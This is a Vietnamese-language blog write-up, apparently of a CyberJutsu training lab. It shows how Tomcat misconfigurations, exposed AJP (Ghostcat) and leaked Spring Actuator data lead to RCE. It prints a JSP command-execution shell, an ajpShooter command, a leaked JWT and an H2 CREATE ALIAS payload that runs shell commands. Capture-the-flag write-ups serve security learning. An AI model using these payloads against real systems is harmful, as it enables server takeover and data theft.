@@ -1,0 +1,313 @@
+<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CBJS Java Misconfiguration Challenge | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="CBJS Java Misconfiguration ChallengeStatement Viewer 1 Đây là Application có chức năng là upload file chỉ có thể upload file pdf hoặc là file txt bên cạnh đó là chức năng view statement để xem lại nhữ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CBJS Java Misconfiguration Challenge">
+<meta property="og:url" content="https://pzhat.github.io/2025/12/25/2025-12-25-CBJS-Misconfiguration/index.html">
+<meta property="og:site_name" content="Phat Mai Blog">
+<meta property="og:description" content="CBJS Java Misconfiguration ChallengeStatement Viewer 1 Đây là Application có chức năng là upload file chỉ có thể upload file pdf hoặc là file txt bên cạnh đó là chức năng view statement để xem lại nhữ">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2025-12-25T13:30:27.815Z">
+<meta property="article:modified_time" content="2025-12-25T13:31:15.673Z">
+<meta property="article:author" content="Phat Mai">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CBJS Java Misconfiguration Challenge",
+  "url": "https://pzhat.github.io/2025/12/25/2025-12-25-CBJS-Misconfiguration/",
+  "image": "https://pzhat.github.io/img/avatar.jpg",
+  "datePublished": "2025-12-25T13:30:27.815Z",
+  "dateModified": "2025-12-25T13:31:15.673Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Phat Mai",
+      "url": "https://pzhat.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/12/25/2025-12-25-CBJS-Misconfiguration/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CBJS Java Misconfiguration Challenge',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">CBJS Java Misconfiguration Challenge</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CBJS Java Misconfiguration Challenge</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-25T13:30:27.815Z" title="Created 2025-12-25 20:30:27">2025-12-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-25T13:31:15.673Z" title="Updated 2025-12-25 20:31:15">2025-12-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CBJS-Java-Misconfiguration-Challenge"><a href="#CBJS-Java-Misconfiguration-Challenge" class="headerlink" title="CBJS Java Misconfiguration Challenge"></a>CBJS Java Misconfiguration Challenge</h1><h3 id="Statement-Viewer-1"><a href="#Statement-Viewer-1" class="headerlink" title="Statement Viewer 1"></a>Statement Viewer 1</h3><p><img src="https://hackmd.io/_uploads/HyJYXUFQZg.png" alt="image"></p>
+<p>Đây là Application có chức năng là <code>upload file</code> chỉ có thể upload file <code>pdf</code> hoặc là file <code>txt</code> bên cạnh đó là chức năng <code>view statement</code> để xem lại những gì mà mình đã upload lên.</p>
+<p><img src="https://hackmd.io/_uploads/rk1BAIKm-g.png" alt="image"></p>
+<p>Sau khi <code>upload file</code> lên ta có thể <code>download</code> file về ở đây với mỗi file được up lên đều có một file path riêng để lưu lại file đó. Vì bài này nó cho sẵn source là white box nên ta sẽ phân tích code.</p>
+<h4 id="Code-Breakdown"><a href="#Code-Breakdown" class="headerlink" title="Code Breakdown"></a>Code Breakdown</h4><p>Vì đây là lab misconfig nên mình sẽ đi vào các nơi gây ra lỗi cụ thể ở đây là các cửa ngõ mà dev để quên khi test web app từ đó attacker có thể lợi dụng chúng để có thể đi sâu vào hệ thống và chiếm quyền điều khiển.</p>
+<p><img src="https://hackmd.io/_uploads/H1oJmcKXZx.png" alt="image"></p>
+<p>Đến với file config là <code>context.xml</code> ta có thể thấy rằng ở đây có một setting đó là <code>privileged=&quot;true&quot;</code> cấu hình này cho phép : </p>
+<ul>
+<li>Cho phép web app truy cập các internal API của Tomcat</li>
+</ul>
+<p>Có thể:</p>
+<ul>
+<li><p>Load class nội bộ của Tomcat</p>
+</li>
+<li><p>Gọi các Servlet&#x2F;Valve nhạy cảm</p>
+</li>
+<li><p>Truy cập JMX, Manager API (nếu misconfig thêm).</p>
+</li>
+</ul>
+<p>Và bình thường cấu hình này sẽ được dùng cho <code>/manager</code> và <code>/host-manager</code> nơi mà giúp quản lý apache tomcat server.</p>
+<p>Nếu như có mỗi cấu hình đó thì cũng sẽ khó để khai thác thêm nhưng ở đây nó còn có thêm cả đoạn.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Valve className=<span class="string">&quot;org.apache.catalina.valves.RemoteAddrValve&quot;</span></span><br><span class="line">       allow=<span class="string">&quot;.*&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Ở đây nó được config rằng tất cả IP đều sẽ truy cập được vào các nơi nội bộ và nếu attacker nắm trong tay tài khoản nào đó như là tài khoản admin tomcat chẳng hạn thì sẽ có thể vào được trang quản lý web.</p>
+<p>Vậy là ta có mắt xích đầu tiên là <code>context.xml</code> sau đó là đến với <code>tomcat-users.xml</code> đây là một file cấu hình cho apache tomcat.</p>
+<p><img src="https://hackmd.io/_uploads/BkaoBqFXWl.png" alt="image"></p>
+<p>Và bên trong file này ta có được mắt xích thứ 2 của bài, ở đây anh dev đã để quên mất một tài khoản của user <code>spike</code> và bên cạnh đó tài khoản này được config các role rất cao của admin từ đây ta hoàn toàn có thể lợi dụng chain này để tiến hành truy cập vào <code>tomcat manager</code>.</p>
+<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p><img src="https://hackmd.io/_uploads/H1uALctQZe.png" alt="image"></p>
+<p>Ta truy cập vào <code>/manager/html</code> sau đó nhập username và password đã khai thác được từ đây ta đã thành công truy cập được vào trang quản lý của apache tomcat.</p>
+<p><img src="https://hackmd.io/_uploads/HkIu38qm-e.png" alt="image"></p>
+<p>Tại tomcat manager ta để ý rằng nó tồn tại chỗ để upload file <code>WAR</code> để deploy lên tại đây ta hoàn toàn có thể tiến hành upload 1 cái shell ở đây để có thể thực hiện điều khiển server (RCE).</p>
+<p><img src="https://hackmd.io/_uploads/HyN8pLcmWg.png" alt="image"></p>
+<p>Tại đây mình sẽ sử dụng một tool đó là <code>godofwar</code> để tạo file WAR shell tham khảo thêm tại : </p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://medium.com/defmax/rce-via-war-upload-in-tomcat-using-path-traversal-e0f11898016e">https://medium.com/defmax/rce-via-war-upload-in-tomcat-using-path-traversal-e0f11898016e</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@mingihongkim/exploiting-java-portlets-with-a-malicious-war-file-to-gain-a-reverse-shell-2504909f71c1">https://medium.com/@mingihongkim/exploiting-java-portlets-with-a-malicious-war-file-to-gain-a-reverse-shell-2504909f71c1</a></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HkrAkPqX-l.png" alt="image"></p>
+<p>Sau khi upload và deploy ta chỉ việc truy cập đến file shell và thành công RCE được web server.</p>
+<p><img src="https://hackmd.io/_uploads/SJ7zlv9Q-e.png" alt="image"></p>
+<h3 id="Statement-Viewer-2"><a href="#Statement-Viewer-2" class="headerlink" title="Statement Viewer 2"></a>Statement Viewer 2</h3><p><img src="https://hackmd.io/_uploads/HkB6rPqXWx.png" alt="image"></p>
+<p>Đến với level 2 thì nó vẫn không có gì khác biệt chức năng chính của web app này sẽ vẫn giống như cũ code hoạt động cả cách nó xử lý vẫn sẽ y hệt nên ta sẽ đi tìm nơi bị misconfig để khai thác mục tiêu ở đây cũng vẫn là RCE.</p>
+<p><img src="https://hackmd.io/_uploads/HkvdUDqQZe.png" alt="image"></p>
+<p>Sau khi thực hiện deploy web app lên thì ta để ý rằng có một đoạn trong log nó start <code>ajp-nio-8009</code> bên cạnh đó bên trong file <code>docker-compose</code> có đoạn expose port 8009.</p>
+<p><img src="https://hackmd.io/_uploads/Hke-DwcQ-e.png" alt="image"></p>
+<p>Vậy cái nơi mà port 8009 đó là cái gì? Theo tìm hiểu thì đó là <code>Apache Jserv Protocol (AJP)</code> nó là một giao thức nhị phân được thiết kế để proxy request từ front-end web server như là <code>Apache HTTPd</code> tới back-end server container (Tomcat).</p>
+<p>Và vấn để ở đây là nếu misconfig hay nghĩa là AJP bị expose ra ngoài internet thì nó sẽ thành nơi mà attacker có thể tương tác với port của AJP và thao túng nó.</p>
+<p>Tomcat dựa vào request được chuyển từ AJP để truy cập tài nguyên webapp bằng API gốc của servlet container - nếu request đó bị crafted đặc biệt, sẽ dẫn tới file read&#x2F;include.</p>
+<p>Vì thế: nếu app có upload và file nằm trong webapp (hoặc attacker control content webapp) thì có thể dẫn đến RCE mà ở đây trong web này nó là một web app với chức năng upload file và download nội dung upload về thì nó là nơi có thể thực hiện RCE.</p>
+<p>Sau khi research thì đây chính là combo tạo nên <code>Ghostcat(CVE-2020-1938)</code>.</p>
+<p><img src="https://hackmd.io/_uploads/r1CK_D5QWl.png" alt="image"></p>
+<p>Sau khi thử truy cập đến port 8009 thì có vẻ như nó chẳng có cái gì hoặc có thể nó không cho phép ta tương tác UI nên ta sẽ tìm hướng khai thác theo kiểu khác.</p>
+<p>Sau khi research mình tìm được quả tool đê test : <a target="_blank" rel="noopener" href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p>
+<p><img src="https://hackmd.io/_uploads/HJuE6D97We.png" alt="image"></p>
+<p>Ở đây mình test vào chall thật luôn ko test local nữa và thành công đọc được file bên trong bây giờ ta sẽ tận dụng nó để có thể thực hiện RCE.</p>
+<p><img src="https://hackmd.io/_uploads/H1Y66DqXbg.png" alt="image"></p>
+<p>Tại đây ta tiến hành upload một file shell.txt sau đó thực hiện sử dụng tool python có sẵn ở đây dùng lệnh : </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py https://statement-viewer-02.java.cyberjutsu-lab.tech/ 8009 /WEB-INF/statements/2460d5ca8a01fa885703e5cb32644b24/fba6c858-27ae-4ad6-b295-eb0168fbbf43.txt <span class="built_in">eval</span></span><br></pre></td></tr></table></figure>
+
+<p>Ở đây nhớ là phải thay đổi folder có chứa shell vì folder nó là userID.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls -la&quot;</span>&#125;);</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(line + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    reader.close();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/HymCWuq7Ze.png" alt="image"></p>
+<p>Sau khi chạy ta đã thành công RCE bằng cách lợi dụng port 8009 bị expose của server đến đây tự cat flag là xong.</p>
+<h3 id="CyberSoc"><a href="#CyberSoc" class="headerlink" title="CyberSoc"></a>CyberSoc</h3><p><img src="https://hackmd.io/_uploads/rJw_Hq5Qbl.png" alt="image"></p>
+<p>Đây là một trang quản lý SOC về luồng xử lý thì nó cũng chưa có gì hấp dẫn vì đây là lab về misconfig nên mình sẽ đi vào các đoạn sink misconfiguration là chủ yếu.</p>
+<p><img src="https://hackmd.io/_uploads/rknI25q7Zg.png" alt="image"></p>
+<p>Check souce code thì ta có thể thấy web app này xài Spring Boot và đặc biệt nó có xài Actuator.</p>
+<p><img src="https://hackmd.io/_uploads/Skd5hcq7bg.png" alt="image"></p>
+<p>Ở đây ta biết được actuator nó là một nơi để mình quản lý project và chính nơi này trong tài liệu của Spring cũng nói rằng nơi đây thường xuyên bị lộ những thông tin bí mật nên khả năng cao ta sẽ khai thác từ các endpoint của actuator.</p>
+<p><img src="https://hackmd.io/_uploads/SJiNxo5mWe.png" alt="image"></p>
+<p>Sau khi truy cập vào đọc code thì ta để ý ở file <code>SecurityConfig</code> bị leak rất nhiều endpoint của admin lẫn actuator và cái bị sai ở đây là dev đã config cho mọi người đều có thể truy cập đến các tài nguyên của API <code>/api/actuator/...</code> và đây là nơi ta có thể lợi dụng để khai thác thêm thông tin.</p>
+<p><img src="https://hackmd.io/_uploads/rkR1-sq7Zg.png" alt="image"></p>
+<p>Ở đoạn <code>application.properties</code> cũng đã config rằng nó expose endpoits actuator như là <code>info,health,env,metrics,logfile,mappings,configprops</code> nên bất kỳ user nào quyền nào cũng có thể vào được thậm chí không cần đăng nhập cũng được.</p>
+<p><img src="https://hackmd.io/_uploads/B1p8Zi5Xbx.png" alt="image"></p>
+<p>Tiếp theo đó tại <code>data.sql</code> ta có thể thấy rằng nó INSERT vào 2 user đó là <code>staff.cybersoc</code> có role là <code>USER</code> và <code>admin</code> với role là <code>ADMIN</code> tuy ở đây nó leak password nhưng đã được mã hoá bằng Bcrypt nó là mã hoá 1 chiều nên không decode ra được nên ta sẽ phải tìm cách khác để đăng nhập được vào.</p>
+<p><img src="https://hackmd.io/_uploads/HkvnNi9mbg.png" alt="image"></p>
+<p>Sau khi truy cập vào <code>/api/actuator/mappings</code> nó leak cho mình một đống endpoint cùng 1 vài config có thể lợi dụng nhưng cũng không cần lắm vì nó leak trong source rồi.</p>
+<p><img src="https://hackmd.io/_uploads/H1PuVj5QZx.png" alt="image"></p>
+<p>Sau khi truy cập vào <code>/api/actuator/logfile</code> ở đây có đoạn : </p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Test token generated, this should be deleted on production: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJzdGFmZi5jeWJlcnNvYyIsInJvbGUiOiJVU0VSIiwiaWF0IjoxNzY2NjUyNDQyLCJleHAiOjE3NjY2NzQwNDJ9.JS5av5h1OwoC6vkLXiNlnc2kCtOMAWeUiuv_VJyiZLU</span><br></pre></td></tr></table></figure>
+
+<p>Vậy là ở đây mình đã tìm được một token bị leak ra và cái token này đáng lẽ nên bị xoá nhưng nó vẫn tồn tại bây giờ mình sẽ thử decode cái token này ra để xem nó là token của user nào.</p>
+<p><img src="https://hackmd.io/_uploads/HkZtBoq7Zl.png" alt="image"></p>
+<p>Vậy là ta kết luận rằng đây là token của user <code>staff.cybersoc</code> và role của nó là USER bây giờ ta sẽ inject vào để truy cập vào <code>/dashboard</code>.</p>
+<p><img src="https://hackmd.io/_uploads/rJJZLoqmZx.png" alt="image"></p>
+<p>Trong <code>JwtAuthorizationFilter</code> ta có thể thấy được chỗ cookie có header là <code>Authorization</code> và bắt đầu với <code>Bearer</code>.</p>
+<p><img src="https://hackmd.io/_uploads/BynoUoq7We.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B18C8ocXbx.png" alt="image"></p>
+<p>Thành công đăng nhập được vào dashboard và lấy được flag đầu tiên.</p>
+<p><img src="https://hackmd.io/_uploads/SkuCdocX-e.png" alt="image"></p>
+<p>Truy cập vào <code>/api/actuator/metrics</code> sau khi vào đây thì có vẻ như không có gì mấy để khai thác nhiều nên ta sẽ đi đến enpoint khác để tìm kiếm thêm.</p>
+<p><img src="https://hackmd.io/_uploads/ryP4Fo9X-x.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Hk3UKiq7Zg.png" alt="image"></p>
+<p>Truy cập vào 2 API endpoint là <code>/admin/console</code> và <code>/api/actuator/configprops</code> cả 2 đều trả về response là <code>403</code> là bị block có lẽ chính là vì nó bị config chỉ có admin được truy cập vào đây. Vậy bây giờ ta sẽ phải tìm hướng đi để leo được lên user có ROLE là admin.</p>
+<p><img src="https://hackmd.io/_uploads/Byyg5oc7bx.png" alt="image"></p>
+<p>Tại đây sau khi truy cập vào được <code>/api/actuator/env</code> ta đã tìm được một điểm misconfig lớn là nó allow user khác đọc được env điều này đã khiến cho <code>SECRET_KEY</code> của JWT đã bị leak ra, với key này ta có thể mod lại JWT và biến mình thành admin.</p>
+<p><img src="https://hackmd.io/_uploads/SkYyTscQZx.png" alt="image"></p>
+<p>Ngon rồi cái token đã valid bây giờ mình sẽ inject thử.</p>
+<p><img src="https://hackmd.io/_uploads/Sy3Lrh5X-e.png" alt="image"></p>
+<p>Đầu tư vào biến token của user <code>staff.cybersoc</code> từ role USER lên ADMIN ngon luôn rồi, bây giờ truy cập vào H2 console response trả về 302 có vẻ như ta đã được redirect đến trang console.</p>
+<p><img src="https://hackmd.io/_uploads/HyDiHhcmWg.png" alt="image"></p>
+<p>Thành công truy cập tới trang console nhưng vấn đề là bây giờ thiếu mất đi password để có thể đăng nhập nên ta sẽ mò tiếp trong actuator xem nó có leak password không.</p>
+<p><img src="https://hackmd.io/_uploads/SyAyP39mWl.png" alt="image"></p>
+<p>Thành công lấy được password của H2 db đăng nhập thành công được user nhờ vào API <code>/api/actuator/configprops</code> đã leak ra password.</p>
+<p><img src="https://hackmd.io/_uploads/ry7gu35XZe.png" alt="image"></p>
+<p>Sau khi đăng nhập thì có một cái bảng tên là <code>flag</code> bây giờ chi việc chạy SQL query để đọc nội dung trong bảng <code>flag</code>.</p>
+<p><img src="https://hackmd.io/_uploads/Sy8rdn57Zl.png" alt="image"></p>
+<p>Thành công lấy được thông tin trong bảng cụ thể ở đây là bảng <code>FLAG</code>. Bây giờ tuy đã đăng nhập vào được <code>H2 Database</code> bây giờ mình sẽ tìm cách leo quyền để có thể thực hiện <code>H2 to RCE</code>.</p>
+<p>Sau khi research một lúc thì vô tình tìm được 1 nguồn hướng dẫn leo quyền ở H2 tham khảo ở : <a target="_blank" rel="noopener" href="https://exp10it.io/posts/h2-rce-in-jre-17/">https://exp10it.io/posts/h2-rce-in-jre-17/</a></p>
+<p><img src="https://hackmd.io/_uploads/BJlT5n9XZx.png" alt="image"></p>
+<p>Sử dụng payload để thực hiện sử dụng shell với câu lệnh <code>ls -la</code> sau đó đưa output ra file <code>output.txt</code>.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1. Tạo bí danh cho các hàm Java cần thiết</span></span><br><span class="line"><span class="keyword">CREATE</span> ALIAS IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">EXEC</span> <span class="keyword">AS</span> $$ </span><br><span class="line">String <span class="keyword">exec</span>(String cmd) throws java.io.IOException &#123;</span><br><span class="line">    String[] command <span class="operator">=</span> &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">    java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(command).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">    <span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$$;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. Thực thi lệnh ls -la và chuyển hướng vào file output.txt</span></span><br><span class="line"><span class="comment">-- Lưu ý: Lệnh này thực thi trên server đang chạy database</span></span><br><span class="line"><span class="keyword">CALL</span> <span class="keyword">EXEC</span>(<span class="string">&#x27;ls -la &gt; output.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (Tùy chọn) Kiểm tra nội dung file vừa tạo bằng cách đọc ngược lại nếu cần</span></span><br><span class="line"><span class="comment">-- CALL EXEC(&#x27;cat output.txt&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/HykrsnqX-x.png" alt="image"></p>
